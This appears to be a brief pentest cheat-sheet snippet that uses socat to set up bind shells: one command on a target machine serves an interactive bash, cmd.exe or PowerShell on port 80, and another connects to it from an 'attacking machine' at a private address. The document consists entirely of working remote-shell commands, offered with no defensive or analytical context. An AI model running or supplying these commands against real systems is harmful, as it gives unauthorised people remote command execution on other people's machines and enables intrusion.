# setup a listener on the target machine
socat tcp-l:80 exec:"bash -li"

# connect to the listener from the attacking machine
socat tcp:10.10.10.20:80 -
# use the pipes argument to interface between the unix and windows ways of handling input and output
socat tcp-l:80 exec:cmd.exe,pipes
socat tcp-l:80 exec:powershell.exe,pipes